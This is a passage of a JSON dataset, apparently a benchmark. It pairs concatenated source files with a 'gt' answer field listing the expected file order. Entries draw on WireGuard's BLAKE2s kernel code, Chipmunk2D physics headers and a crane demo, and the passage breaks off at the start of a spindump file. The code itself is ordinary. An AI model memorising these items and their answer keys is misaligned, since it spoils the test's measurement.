9, 14, 3, 12, 13, 0 },\n};\n\nstatic inline void blake2s_set_lastblock(struct blake2s_state *state)\n{\n\tstate->f[0] = -1;\n}\n\nstatic inline void blake2s_increment_counter(struct blake2s_state *state,\n\t\t\t\t\t     const u32 inc)\n{\n\tstate->t[0] += inc;\n\tstate->t[1] += (state->t[0] < inc);\n}\n\nstatic inline void blake2s_init_param(struct blake2s_state *state,\n\t\t\t\t      const u32 param)\n{\n\tint i;\n\n\tmemset(state, 0, sizeof(*state));\n\tfor (i = 0; i < 8; ++i)\n\t\tstate->h[i] = blake2s_iv[i];\n\tstate->h[0] ^= param;\n}\n\nvoid blake2s_init(struct blake2s_state *state, const size_t outlen)\n{\n\tWARN_ON(IS_ENABLED(DEBUG) && (!outlen || outlen > BLAKE2S_HASH_SIZE));\n\tblake2s_init_param(state, 0x01010000 | outlen);\n\tstate->outlen = outlen;\n}\n\nvoid blake2s_init_key(struct blake2s_state *state, const size_t outlen,\n\t\t      const void *key, const size_t keylen)\n{\n\tu8 block[BLAKE2S_BLOCK_SIZE] = { 0 };\n\n\tWARN_ON(IS_ENABLED(DEBUG) && (!outlen || outlen > BLAKE2S_HASH_SIZE ||\n\t\t!key || !keylen || keylen > BLAKE2S_KEY_SIZE));\n\tblake2s_init_param(state, 0x01010000 | keylen << 8 | outlen);\n\tstate->outlen = outlen;\n\tmemcpy(block, key, keylen);\n\tblake2s_update(state, block, BLAKE2S_BLOCK_SIZE);\n\tmemzero_explicit(block, BLAKE2S_BLOCK_SIZE);\n}\n\n#if defined(CONFIG_ZINC_ARCH_X86_64)\n#include \"blake2s-x86_64-glue.c\"\n#else\nstatic bool *const blake2s_nobs[] __initconst = { };\nstatic void __init blake2s_fpu_init(void)\n{\n}\nstatic inline bool blake2s_compress_arch(struct blake2s_state *state,\n\t\t\t\t\t const u8 *block, size_t nblocks,\n\t\t\t\t\t const u32 inc)\n{\n\treturn false;\n}\n#endif\n\nstatic inline void blake2s_compress(struct blake2s_state *state,\n\t\t\t\t    const u8 *block, size_t nblocks,\n\t\t\t\t    const u32 inc)\n{\n\tu32 m[16];\n\tu32 v[16];\n\tint i;\n\n\tWARN_ON(IS_ENABLED(DEBUG) &&\n\t\t(nblocks > 1 && inc != BLAKE2S_BLOCK_SIZE));\n\n\tif (blake2s_compress_arch(state, block, nblocks, inc))\n\t\treturn;\n\n\twhile (nblocks > 0) {\n\t\tblake2s_increment_counter(state, inc);\n\t\tmemcpy(m, block, BLAKE2S_BLOCK_SIZE);\n\t\tle32_to_cpu_array(m, ARRAY_SIZE(m));\n\t\tmemcpy(v, state->h, 32);\n\t\tv[ 8] = blake2s_iv[0];\n\t\tv[ 9] = blake2s_iv[1];\n\t\tv[10] = blake2s_iv[2];\n\t\tv[11] = blake2s_iv[3];\n\t\tv[12] = blake2s_iv[4] ^ state->t[0];\n\t\tv[13] = blake2s_iv[5] ^ state->t[1];\n\t\tv[14] = blake2s_iv[6] ^ state->f[0];\n\t\tv[15] = blake2s_iv[7] ^ state->f[1];\n\n#define G(r, i, a, b, c, d) do { \\\n\ta += b + m[blake2s_sigma[r][2 * i + 0]]; \\\n\td = ror32(d ^ a, 16); \\\n\tc += d; \\\n\tb = ror32(b ^ c, 12); \\\n\ta += b + m[blake2s_sigma[r][2 * i + 1]]; \\\n\td = ror32(d ^ a, 8); \\\n\tc += d; \\\n\tb = ror32(b ^ c, 7); \\\n} while (0)\n\n#define ROUND(r) do { \\\n\tG(r, 0, v[0], v[ 4], v[ 8], v[12]); \\\n\tG(r, 1, v[1], v[ 5], v[ 9], v[13]); \\\n\tG(r, 2, v[2], v[ 6], v[10], v[14]); \\\n\tG(r, 3, v[3], v[ 7], v[11], v[15]); \\\n\tG(r, 4, v[0], v[ 5], v[10], v[15]); \\\n\tG(r, 5, v[1], v[ 6], v[11], v[12]); \\\n\tG(r, 6, v[2], v[ 7], v[ 8], v[13]); \\\n\tG(r, 7, v[3], v[ 4], v[ 9], v[14]); \\\n} while (0)\n\t\tROUND(0);\n\t\tROUND(1);\n\t\tROUND(2);\n\t\tROUND(3);\n\t\tROUND(4);\n\t\tROUND(5);\n\t\tROUND(6);\n\t\tROUND(7);\n\t\tROUND(8);\n\t\tROUND(9);\n\n#undef G\n#undef ROUND\n\n\t\tfor (i = 0; i < 8; ++i)\n\t\t\tstate->h[i] ^= v[i] ^ v[i + 8];\n\n\t\tblock += BLAKE2S_BLOCK_SIZE;\n\t\t--nblocks;\n\t}\n}\n\nvoid blake2s_update(struct blake2s_state *state, const u8 *in, size_t inlen)\n{\n\tconst size_t fill = BLAKE2S_BLOCK_SIZE - state->buflen;\n\n\tif (unlikely(!inlen))\n\t\treturn;\n\tif (inlen > fill) {\n\t\tmemcpy(state->buf + state->buflen, in, fill);\n\t\tblake2s_compress(state, state->buf, 1, BLAKE2S_BLOCK_SIZE);\n\t\tstate->buflen = 0;\n\t\tin += fill;\n\t\tinlen -= fill;\n\t}\n\tif (inlen > BLAKE2S_BLOCK_SIZE) {\n\t\tconst size_t nblocks = DIV_ROUND_UP(inlen, BLAKE2S_BLOCK_SIZE);\n\n\t\tblake2s_compress(state, in, nblocks - 1, BLAKE2S_BLOCK_SIZE);\n\t\tin += BLAKE2S_BLOCK_SIZE * (nblocks - 1);\n\t\tinlen -= BLAKE2S_BLOCK_SIZE * (nblocks - 1);\n\t}\n\tmemcpy(state->buf + state->buflen, in, inlen);\n\tstate->buflen += inlen;\n}\n\nvoid blake2s_final(struct blake2s_state *state, u8 *out)\n{\n\tWARN_ON(IS_ENABLED(DEBUG) && !out);\n\tblake2s_set_lastblock(state);\n\tmemset(state->buf + state->buflen, 0,\n\t       BLAKE2S_BLOCK_SIZE - state->buflen);\n\tblake2s_compress(state, state->buf, 1, state->buflen);\n\tcpu_to_le32_array(state->h, ARRAY_SIZE(state->h));\n\tmemcpy(out, state->h, state->outlen);\n\tmemzero_explicit(state, sizeof(*state));\n}\n\nvoid blake2s_hmac(u8 *out, const u8 *in, const u8 *key, const size_t outlen,\n\t\t  const size_t inlen, const size_t keylen)\n{\n\tstruct blake2s_state state;\n\tu8 x_key[BLAKE2S_BLOCK_SIZE] __aligned(__alignof__(u32)) = { 0 };\n\tu8 i_hash[BLAKE2S_HASH_SIZE] __aligned(__alignof__(u32));\n\tint i;\n\n\tif (keylen > BLAKE2S_BLOCK_SIZE) {\n\t\tblake2s_init(&state, BLAKE2S_HASH_SIZE);\n\t\tblake2s_update(&state, key, keylen);\n\t\tblake2s_final(&state, x_key);\n\t} else\n\t\tmemcpy(x_key, key, keylen);\n\n\tfor (i = 0; i < BLAKE2S_BLOCK_SIZE; ++i)\n\t\tx_key[i] ^= 0x36;\n\n\tblake2s_init(&state, BLAKE2S_HASH_SIZE);\n\tblake2s_update(&state, x_key, BLAKE2S_BLOCK_SIZE);\n\tblake2s_update(&state, in, inlen);\n\tblake2s_final(&state, i_hash);\n\n\tfor (i = 0; i < BLAKE2S_BLOCK_SIZE; ++i)\n\t\tx_key[i] ^= 0x5c ^ 0x36;\n\n\tblake2s_init(&state, BLAKE2S_HASH_SIZE);\n\tblake2s_update(&state, x_key, BLAKE2S_BLOCK_SIZE);\n\tblake2s_update(&state, i_hash, BLAKE2S_HASH_SIZE);\n\tblake2s_final(&state, i_hash);\n\n\tmemcpy(out, i_hash, outlen);\n\tmemzero_explicit(x_key, BLAKE2S_BLOCK_SIZE);\n\tmemzero_explicit(i_hash, BLAKE2S_HASH_SIZE);\n}\n\n#include \"../selftest/blake2s.c\"\n\nstatic bool nosimd __initdata = false;\n\n#ifndef COMPAT_ZINC_IS_A_MODULE\nint __init blake2s_mod_init(void)\n#else\nstatic int __init mod_init(void)\n#endif\n{\n\tif (!nosimd)\n\t\tblake2s_fpu_init();\n\tif (!selftest_run(\"blake2s\", blake2s_selftest, blake2s_nobs,\n\t\t\t  ARRAY_SIZE(blake2s_nobs)))\n\t\treturn -ENOTRECOVERABLE;\n\treturn 0;\n}\n\n#ifdef COMPAT_ZINC_IS_A_MODULE\nstatic void __exit mod_exit(void)\n{\n}\n\nmodule_param(nosimd, bool, 0);\nmodule_init(mod_init);\nmodule_exit(mod_exit);\nMODULE_LICENSE(\"GPL v2\");\nMODULE_DESCRIPTION(\"BLAKE2s hash function\");\nMODULE_AUTHOR(\"Jason A. Donenfeld <Jason@zx2c4.com>\");\n#endif\n\n'wireguard-linux-compat/src/crypto/zinc/blake2s/blake2s-x86_64-glue.c'\n:\n\n\n#include <linux/simd.h>\n#include <asm/cpufeature.h>\n#include <asm/processor.h>\n#include <asm/fpu/api.h>\n\nasmlinkage void blake2s_compress_ssse3(struct blake2s_state *state,\n\t\t\t\t       const u8 *block, const size_t nblocks,\n\t\t\t\t       const u32 inc);\nasmlinkage void blake2s_compress_avx512(struct blake2s_state *state,\n\t\t\t\t\tconst u8 *block, const size_t nblocks,\n\t\t\t\t\tconst u32 inc);\n\nstatic bool blake2s_use_ssse3 __ro_after_init;\nstatic bool blake2s_use_avx512 __ro_after_init;\nstatic bool *const blake2s_nobs[] __initconst = { &blake2s_use_ssse3,\n\t\t\t\t\t\t  &blake2s_use_avx512 };\n\nstatic void __init blake2s_fpu_init(void)\n{\n\tblake2s_use_ssse3 = boot_cpu_has(X86_FEATURE_SSSE3);\n#ifndef COMPAT_CANNOT_USE_AVX512\n\tblake2s_use_avx512 =\n\t\tboot_cpu_has(X86_FEATURE_AVX) &&\n\t\tboot_cpu_has(X86_FEATURE_AVX2) &&\n\t\tboot_cpu_has(X86_FEATURE_AVX512F) &&\n\t\tboot_cpu_has(X86_FEATURE_AVX512VL) &&\n\t\tcpu_has_xfeatures(XFEATURE_MASK_SSE | XFEATURE_MASK_YMM |\n\t\t\t\t  XFEATURE_MASK_AVX512, NULL);\n#endif\n}\n\nstatic inline bool blake2s_compress_arch(struct blake2s_state *state,\n\t\t\t\t\t const u8 *block, size_t nblocks,\n\t\t\t\t\t const u32 inc)\n{\n\tsimd_context_t simd_context;\n\tbool used_arch = false;\n\n\n\tBUILD_BUG_ON(PAGE_SIZE / BLAKE2S_BLOCK_SIZE < 8);\n\n\tsimd_get(&simd_context);\n\n\tif (!IS_ENABLED(CONFIG_AS_SSSE3) || !blake2s_use_ssse3 ||\n\t    !simd_use(&simd_context))\n\t\tgoto out;\n\tused_arch = true;\n\n\tfor (;;) {\n\t\tconst size_t blocks = min_t(size_t, nblocks,\n\t\t\t\t\t    PAGE_SIZE / BLAKE2S_BLOCK_SIZE);\n\n\t\tif (IS_ENABLED(CONFIG_AS_AVX512) && blake2s_use_avx512)\n\t\t\tblake2s_compress_avx512(state, block, blocks, inc);\n\t\telse\n\t\t\tblake2s_compress_ssse3(state, block, blocks, inc);\n\n\t\tnblocks -= blocks;\n\t\tif (!nblocks)\n\t\t\tbreak;\n\t\tblock += blocks * BLAKE2S_BLOCK_SIZE;\n\t\tsimd_relax(&simd_context);\n\t}\nout:\n\tsimd_put(&simd_context);\n\treturn used_arch;\n}\n\n'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'\n:\n\n\n#ifndef _WG_SIMD_H\n#define _WG_SIMD_H\n\n#include <linux/sched.h>\n#include <asm/simd.h>\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n#include <asm/neon.h>\n#endif\n\ntypedef enum {\n\tHAVE_NO_SIMD = 1 << 0,\n\tHAVE_FULL_SIMD = 1 << 1,\n\tHAVE_SIMD_IN_USE = 1 << 31\n} simd_context_t;\n\n#define DONT_USE_SIMD ((simd_context_t []){ HAVE_NO_SIMD })\n\nstatic inline void simd_get(simd_context_t *ctx)\n{\n\t*ctx = !IS_ENABLED(CONFIG_PREEMPT_RT) && !IS_ENABLED(CONFIG_PREEMPT_RT_BASE) && may_use_simd() ? HAVE_FULL_SIMD : HAVE_NO_SIMD;\n}\n\nstatic inline void simd_put(simd_context_t *ctx)\n{\n#if defined(CONFIG_X86_64)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_fpu_end();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_neon_end();\n#endif\n\t*ctx = HAVE_NO_SIMD;\n}\n\nstatic inline bool simd_relax(simd_context_t *ctx)\n{\n#ifdef CONFIG_PREEMPT\n\tif ((*ctx & HAVE_SIMD_IN_USE) && need_resched()) {\n\t\tsimd_put(ctx);\n\t\tsimd_get(ctx);\n\t\treturn true;\n\t}\n#endif\n\treturn false;\n}\n\nstatic __must_check inline bool simd_use(simd_context_t *ctx)\n{\n\tif (!(*ctx & HAVE_FULL_SIMD))\n\t\treturn false;\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\treturn true;\n#if defined(CONFIG_X86_64)\n\tkernel_fpu_begin();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tkernel_neon_begin();\n#endif\n\t*ctx |= HAVE_SIMD_IN_USE;\n\treturn true;\n}\n\n#endif\n\n'wireguard-linux-compat/src/compat/neon-arm/include/asm/neon.h'\n:#ifndef _ARCH_ARM_ASM_NEON\n#define _ARCH_ARM_ASM_NEON\n#define kernel_neon_begin() \\\n\tBUILD_BUG_ON_MSG(1, \"This kernel does not support ARM NEON\")\n#define kernel_neon_end() \\\n\tBUILD_BUG_ON_MSG(1, \"This kernel does not support ARM NEON\")\n#endif\n",
        "gt": [
            "'wireguard-linux-compat/src/compat/neon-arm/include/asm/neon.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/zinc/blake2s/blake2s-x86_64-glue.c'",
            "'wireguard-linux-compat/src/crypto/zinc/blake2s/blake2s.c'"
        ]
    },
    {
        "files": [
            "'Chipmunk2D/include/chipmunk/chipmunk.h'",
            "'Chipmunk2D/include/chipmunk/cpConstraint.h'",
            "'Chipmunk2D/include/chipmunk/cpRotaryLimitJoint.h'",
            "'Chipmunk2D/demo/Crane.c'"
        ],
        "content": "'Chipmunk2D/include/chipmunk/chipmunk.h'\n:\n\n#ifndef CHIPMUNK_H\n#define CHIPMUNK_H\n\n#include <stdlib.h>\n#include <math.h>\n\n#ifndef alloca\n\t#ifdef _WIN32\n\t\t#include <malloc.h>\n\t#elif defined(__FreeBSD__)\n\n\t#else\n\t\t#include <alloca.h>\n\t#endif\n#endif\n\n#ifdef _WIN32\n\t#define CP_EXPORT __declspec(dllexport)\n#else\n\t#define CP_EXPORT\n#endif\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nCP_EXPORT void cpMessage(const char *condition, const char *file, int line, int isError, int isHardError, const char *message, ...);\n#ifdef NDEBUG\n\t#define\tcpAssertWarn(__condition__, ...)\n\t#define\tcpAssertSoft(__condition__, ...)\n#else\n\t#define cpAssertSoft(__condition__, ...) if(!(__condition__)){cpMessage(#__condition__, __FILE__, __LINE__, 1, 0, __VA_ARGS__); abort();}\n\t#define cpAssertWarn(__condition__, ...) if(!(__condition__)) cpMessage(#__condition__, __FILE__, __LINE__, 0, 0, __VA_ARGS__)\n#endif\n\n\n#define cpAssertHard(__condition__, ...) if(!(__condition__)){cpMessage(#__condition__, __FILE__, __LINE__, 1, 1, __VA_ARGS__); abort();}\n\n#include \"chipmunk_types.h\"\n\n\n\n\n\n#ifndef CP_BUFFER_BYTES\n\t#define CP_BUFFER_BYTES (32*1024)\n#endif\n\n#ifndef cpcalloc\n\n\t#define cpcalloc calloc\n#endif\n\n#ifndef cprealloc\n\n\t#define cprealloc realloc\n#endif\n\n#ifndef cpfree\n\n\t#define cpfree free\n#endif\n\ntypedef struct cpArray cpArray;\ntypedef struct cpHashSet cpHashSet;\n\ntypedef struct cpBody cpBody;\n\ntypedef struct cpShape cpShape;\ntypedef struct cpCircleShape cpCircleShape;\ntypedef struct cpSegmentShape cpSegmentShape;\ntypedef struct cpPolyShape cpPolyShape;\n\ntypedef struct cpConstraint cpConstraint;\ntypedef struct cpPinJoint cpPinJoint;\ntypedef struct cpSlideJoint cpSlideJoint;\ntypedef struct cpPivotJoint cpPivotJoint;\ntypedef struct cpGrooveJoint cpGrooveJoint;\ntypedef struct cpDampedSpring cpDampedSpring;\ntypedef struct cpDampedRotarySpring cpDampedRotarySpring;\ntypedef struct cpRotaryLimitJoint cpRotaryLimitJoint;\ntypedef struct cpRatchetJoint cpRatchetJoint;\ntypedef struct cpGearJoint cpGearJoint;\ntypedef struct cpSimpleMotorJoint cpSimpleMotorJoint;\n\ntypedef struct cpCollisionHandler cpCollisionHandler;\ntypedef struct cpContactPointSet cpContactPointSet;\ntypedef struct cpArbiter cpArbiter;\n\ntypedef struct cpSpace cpSpace;\n\n#include \"cpVect.h\"\n#include \"cpBB.h\"\n#include \"cpTransform.h\"\n#include \"cpSpatialIndex.h\"\n\n#include \"cpArbiter.h\"\n\n#include \"cpBody.h\"\n#include \"cpShape.h\"\n#include \"cpPolyShape.h\"\n\n#include \"cpConstraint.h\"\n\n#include \"cpSpace.h\"\n\n\n#define CP_VERSION_MAJOR 7\n#define CP_VERSION_MINOR 0\n#define CP_VERSION_RELEASE 3\n\n\nCP_EXPORT extern const char *cpVersionString;\n\n\n\nCP_EXPORT cpFloat cpMomentForCircle(cpFloat m, cpFloat r1, cpFloat r2, cpVect offset);\n\n\n\nCP_EXPORT cpFloat cpAreaForCircle(cpFloat r1, cpFloat r2);\n\n\n\nCP_EXPORT cpFloat cpMomentForSegment(cpFloat m, cpVect a, cpVect b, cpFloat radius);\n\n\nCP_EXPORT cpFloat cpAreaForSegment(cpVect a, cpVect b, cpFloat radius);\n\n\nCP_EXPORT cpFloat cpMomentForPoly(cpFloat m, int count, const cpVect *verts, cpVect offset, cpFloat radius);\n\n\n\nCP_EXPORT cpFloat cpAreaForPoly(const int count, const cpVect *verts, cpFloat radius);\n\n\nCP_EXPORT cpVect cpCentroidForPoly(const int count, const cpVect *verts);\n\n\nCP_EXPORT cpFloat cpMomentForBox(cpFloat m, cpFloat width, cpFloat height);\n\n\nCP_EXPORT cpFloat cpMomentForBox2(cpFloat m, cpBB box);\n\n\n\n\n\nCP_EXPORT int cpConvexHull(int count, const cpVect *verts, cpVect *result, int *first, cpFloat tol);\n\n\n\n\n\n#define CP_CONVEX_HULL(__count__, __verts__, __count_var__, __verts_var__) \\\ncpVect *__verts_var__ = (cpVect *)alloca(__count__*sizeof(cpVect)); \\\nint __count_var__ = cpConvexHull(__count__, __verts__, __verts_var__, NULL, 0.0); \\\n\n\nstatic inline cpVect\ncpClosetPointOnSegment(const cpVect p, const cpVect a, const cpVect b)\n{\n\tcpVect delta = cpvsub(a, b);\n\tcpFloat t = cpfclamp01(cpvdot(delta, cpvsub(p, b))/cpvlengthsq(delta));\n\treturn cpvadd(b, cpvmult(delta, t));\n}\n\n#if defined(__has_extension)\n#if __has_extension(blocks)\n\n\n\n\nvoid cpSpaceEachBody_b(cpSpace *space, void (^block)(cpBody *body));\nvoid cpSpaceEachShape_b(cpSpace *space, void (^block)(cpShape *shape));\nvoid cpSpaceEachConstraint_b(cpSpace *space, void (^block)(cpConstraint *constraint));\n\nvoid cpBodyEachShape_b(cpBody *body, void (^block)(cpShape *shape));\nvoid cpBodyEachConstraint_b(cpBody *body, void (^block)(cpConstraint *constraint));\nvoid cpBodyEachArbiter_b(cpBody *body, void (^block)(cpArbiter *arbiter));\n\ntypedef void (^cpSpacePointQueryBlock)(cpShape *shape, cpVect point, cpFloat distance, cpVect gradient);\nvoid cpSpacePointQuery_b(cpSpace *space, cpVect point, cpFloat maxDistance, cpShapeFilter filter, cpSpacePointQueryBlock block);\n\ntypedef void (^cpSpaceSegmentQueryBlock)(cpShape *shape, cpVect point, cpVect normal, cpFloat alpha);\nvoid cpSpaceSegmentQuery_b(cpSpace *space, cpVect start, cpVect end, cpFloat radius, cpShapeFilter filter, cpSpaceSegmentQueryBlock block);\n\ntypedef void (^cpSpaceBBQueryBlock)(cpShape *shape);\nvoid cpSpaceBBQuery_b(cpSpace *space, cpBB bb, cpShapeFilter filter, cpSpaceBBQueryBlock block);\n\ntypedef void (^cpSpaceShapeQueryBlock)(cpShape *shape, cpContactPointSet *points);\ncpBool cpSpaceShapeQuery_b(cpSpace *space, cpShape *shape, cpSpaceShapeQueryBlock block);\n\n#endif\n#endif\n\n\n\n\n#ifdef __cplusplus\n}\n\nstatic inline cpVect operator *(const cpVect v, const cpFloat s){return cpvmult(v, s);}\nstatic inline cpVect operator +(const cpVect v1, const cpVect v2){return cpvadd(v1, v2);}\nstatic inline cpVect operator -(const cpVect v1, const cpVect v2){return cpvsub(v1, v2);}\nstatic inline cpBool operator ==(const cpVect v1, const cpVect v2){return cpveql(v1, v2);}\nstatic inline cpVect operator -(const cpVect v){return cpvneg(v);}\n\n#endif\n#endif\n\n'Chipmunk2D/include/chipmunk/cpConstraint.h'\n:\n\n\n\n\n\ntypedef void (*cpConstraintPreSolveFunc)(cpConstraint *constraint, cpSpace *space);\n\ntypedef void (*cpConstraintPostSolveFunc)(cpConstraint *constraint, cpSpace *space);\n\n\nCP_EXPORT void cpConstraintDestroy(cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintFree(cpConstraint *constraint);\n\n\nCP_EXPORT cpSpace* cpConstraintGetSpace(const cpConstraint *constraint);\n\n\nCP_EXPORT cpBody* cpConstraintGetBodyA(const cpConstraint *constraint);\n\n\nCP_EXPORT cpBody* cpConstraintGetBodyB(const cpConstraint *constraint);\n\n\nCP_EXPORT cpFloat cpConstraintGetMaxForce(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetMaxForce(cpConstraint *constraint, cpFloat maxForce);\n\n\nCP_EXPORT cpFloat cpConstraintGetErrorBias(const cpConstraint *constraint);\n\n\n\nCP_EXPORT void cpConstraintSetErrorBias(cpConstraint *constraint, cpFloat errorBias);\n\n\nCP_EXPORT cpFloat cpConstraintGetMaxBias(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetMaxBias(cpConstraint *constraint, cpFloat maxBias);\n\n\nCP_EXPORT cpBool cpConstraintGetCollideBodies(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetCollideBodies(cpConstraint *constraint, cpBool collideBodies);\n\n\nCP_EXPORT cpConstraintPreSolveFunc cpConstraintGetPreSolveFunc(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetPreSolveFunc(cpConstraint *constraint, cpConstraintPreSolveFunc preSolveFunc);\n\n\nCP_EXPORT cpConstraintPostSolveFunc cpConstraintGetPostSolveFunc(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetPostSolveFunc(cpConstraint *constraint, cpConstraintPostSolveFunc postSolveFunc);\n\n\nCP_EXPORT cpDataPointer cpConstraintGetUserData(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetUserData(cpConstraint *constraint, cpDataPointer userData);\n\n\nCP_EXPORT cpFloat cpConstraintGetImpulse(cpConstraint *constraint);\n\n#include \"cpPinJoint.h\"\n#include \"cpSlideJoint.h\"\n#include \"cpPivotJoint.h\"\n#include \"cpGrooveJoint.h\"\n#include \"cpDampedSpring.h\"\n#include \"cpDampedRotarySpring.h\"\n#include \"cpRotaryLimitJoint.h\"\n#include \"cpRatchetJoint.h\"\n#include \"cpGearJoint.h\"\n#include \"cpSimpleMotor.h\"\n\n\n\n'Chipmunk2D/include/chipmunk/cpRotaryLimitJoint.h'\n:\n\n\n\n\n\nCP_EXPORT cpBool cpConstraintIsRotaryLimitJoint(const cpConstraint *constraint);\n\n\nCP_EXPORT cpRotaryLimitJoint* cpRotaryLimitJointAlloc(void);\n\nCP_EXPORT cpRotaryLimitJoint* cpRotaryLimitJointInit(cpRotaryLimitJoint *joint, cpBody *a, cpBody *b, cpFloat min, cpFloat max);\n\nCP_EXPORT cpConstraint* cpRotaryLimitJointNew(cpBody *a, cpBody *b, cpFloat min, cpFloat max);\n\n\nCP_EXPORT cpFloat cpRotaryLimitJointGetMin(const cpConstraint *constraint);\n\nCP_EXPORT void cpRotaryLimitJointSetMin(cpConstraint *constraint, cpFloat min);\n\n\nCP_EXPORT cpFloat cpRotaryLimitJointGetMax(const cpConstraint *constraint);\n\nCP_EXPORT void cpRotaryLimitJointSetMax(cpConstraint *constraint, cpFloat max);\n\n\n\n'Chipmunk2D/demo/Crane.c'\n:\n\n#include \"chipmunk/chipmunk.h\"\n#include \"ChipmunkDemo.h\"\n\nstatic cpBody *dollyBody = NULL;\n\nstatic cpConstraint *dollyServo = NULL;\n\n\nstatic cpConstraint *winchServo = NULL;\n\n\nstatic cpConstraint *hookJoint = NULL;\n\n\nstatic void\nupdate(cpSpace *space, double dt)\n{\n\n\tcpPivotJointSetAnchorA(dollyServo, cpv(ChipmunkDemoMouse.x, 100));\n\n\n\tcpSlideJointSetMax(winchServo, cpfmax(100 - ChipmunkDemoMouse.y, 50));\n\n\tif(hookJoint && ChipmunkDemoRightClick){\n\t\tcpSpaceRemoveConstraint(space, hookJoint);\n\t\tcpConstraintFree(hookJoint);\n\t\thookJoint = NULL;\n\t}\n\n\tcpSpaceStep(space, dt);\n}\n\nenum COLLISION_TYPES {\n\tHOOK_SENSOR = 1,\n\tCRATE,\n};\n\nstatic void\nAttachHook(cpSpace *space, cpBody *hook, cpBody *crate)\n{\n\thookJoint = cpSpaceAddConstraint(space, cpPivotJointNew(hook, crate, cpBodyGetPosition(hook)));\n}\n\n\nstatic cpBool\nHookCrate(cpArbiter *arb, cpSpace *space, void *data)\n{\n\tif(hookJoint == NULL){\n\n\n\n\t\tCP_ARBITER_GET_BODIES(arb, hook, crate);\n\n\n\n\n\t\tcpSpaceAddPostStepCallback(space, (cpPostStepFunc)AttachHook, hook, crate);\n\t}\n\n\treturn cpTrue;\n}\n\n\nstatic cpSpace *\ninit(void)\n{\n\tChipmunkDemoMessageString = \"Control the crane by moving the mouse. Right click to release.\";\n\n\tcpSpace *space = cpSpaceNew();\n\tcpSpaceSetIterations(space, 30);\n\tcpSpaceSetGravity(space, cpv(0, -100));\n\tcpSpaceSetDamping(space, 0.8);\n\n\tcpBody *staticBody = cpSpaceGetStaticBody(space);\n\tcpShape *shape;\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(-320,-240), cpv(320,-240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\n\tdollyBody = cpSpaceAddBody(space, cpBodyNew(10, INFINITY));\n\tcpBodySetPosition(dollyBody, cpv(0, 100));\n\n\n\tcpSpaceAddShape(space, cpBoxShapeNew(dollyBody, 30, 30, 0.0));\n\n\n\tcpSpaceAddConstraint(space, cpGrooveJointNew(staticBody, dollyBody, cpv(-250, 100), cpv(250, 100), cpvzero));\n\n\n\n\tdollyServo = cpSpaceAddConstraint(space, cpPivotJointNew(staticBody, dollyBody, cpBodyGetPosition(dollyBody)));\n\n\tcpConstraintSetMaxForce(dollyServo, 10000);\n\n\tcpConstraintSetMaxBias(dollyServo, 100);\n\n\n\n\n\n\tcpBody *hookBody = cpSpaceAddBody(space, cpBodyNew(1, INFINITY));\n\tcpBodySetPosition(hookBody, cpv(0, 50));\n\n\n\tshape = cpSpaceAddShape(space, cpCircleShapeNew(hookBody, 10, cpvzero));\n\tcpShapeSetSensor(shape, cpTrue);\n\tcpShapeSetCollisionType(shape, HOOK_SENSOR);\n\n\n\n\twinchServo = cpSpaceAddConstraint(space, cpSlideJointNew(dollyBody, hookBody, cpvzero, cpvzero, 0, INFINITY));\n\n\tcpConstraintSetMaxForce(winchServo, 30000);\n\n\tcpConstraintSetMaxBias(winchServo, 60);\n\n\n\n\tcpBody *boxBody = cpSpaceAddBody(space, cpBodyNew(30, cpMomentForBox(30, 50, 50)));\n\tcpBodySetPosition(boxBody, cpv(200, -200));\n\n\n\tshape = cpSpaceAddShape(space, cpBoxShapeNew(boxBody, 50, 50, 0.0));\n\tcpShapeSetFriction(shape, 0.7);\n\tcpShapeSetCollisionType(shape, CRATE);\n\n\tcpCollisionHandler *handler = cpSpaceAddCollisionHandler(space, HOOK_SENSOR, CRATE);\n\thandler->beginFunc = (cpCollisionBeginFunc)HookCrate;\n\n\n\treturn space;\n}\n\nstatic void\ndestroy(cpSpace *space)\n{\n\tChipmunkDemoFreeSpaceChildren(space);\n\tcpSpaceFree(space);\n}\n\nChipmunkDemo Crane = {\n\t\"Crane\",\n\t1.0/60.0,\n\tinit,\n\tupdate,\n\tChipmunkDemoDefaultDrawImpl,\n\tdestroy,\n};\n",
        "gt": [
            "'Chipmunk2D/include/chipmunk/cpRotaryLimitJoint.h'",
            "'Chipmunk2D/include/chipmunk/cpConstraint.h'",
            "'Chipmunk2D/include/chipmunk/chipmunk.h'",
            "'Chipmunk2D/demo/Crane.c'"
        ]
    },
    {
        "files": [
            "'spindump/src/spindump_titalia_delaybit.c'",
            "'spindump/src/spindump_titalia_delaybit.h'",
            "'spindump/src/spindump_connections_structs.h'",
            "'spindump/src/spindump_tags.h'"
        ],
        "content": "'spindump/src/spindump_titalia_delaybit.c'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#include <stdlib.h>\n#include \"spindump_titalia_delaybit.h\"\n#include \"spindump_analyze.h\"\n#include \"spindump_connections.h\"\n#include \"spindump_connections_structs.h\"\n#include \"spindump_util.h\"\n\n\n\n\n\n\n\n\n\nvoid\nspindump_delaybittracker_observeandcalculatertt(struct spindump_analyze* state,\n                                                struct spindump_packet* packet,\n                                                struct spindump_connection* connection,\n                                                struct timeval* ts,\n                                                int fromResponder,\n                                                unsigned int ipPacketLength,\n                                                spindump_extrameas_int extrameasbits) {\n\n\n\n\n\n  if 